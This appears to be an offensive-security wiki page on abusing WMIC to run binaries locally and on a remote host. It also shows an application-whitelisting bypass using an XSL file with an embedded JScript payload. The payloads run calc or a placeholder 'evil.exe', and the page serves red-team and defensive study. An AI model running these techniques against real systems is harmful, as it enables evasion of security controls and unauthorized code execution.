# WMIC

## Theory

Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. We can try to execute binary or XSL file that contain jscript payload with WMIC.

## Practice

{% tabs %}
{% tab title="Binary" %}
Execute local binary (calc.exe)

```bash
wmic.exe process call create calc
```

Execute binary on remote system (evil.exe)

```bash
wmic.exe /node:"192.168.0.1" process call create "evil.exe"
```
{% endtab %}

{% tab title="XSL" %}
Another application whitelist bypassing technique discovered by Casey @subTee, similar to squiblydoo

Define the XSL file containing the jscript payload:

```bash
#evil.xsl
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("calc");
	]]> </ms:script>
</stylesheet>
```

Invoke wmic command and specify /format pointing to the evil.xsl:

```bash
wmic os get /FORMAT:"evil.xsl"
```

Execute binary on remote system (evil.exe)

```bash
wmic.exe /node:"192.168.0.1" process call create "evil.exe"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/livingofftheland" %}

{% embed url="https://www.ired.team/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl" %}
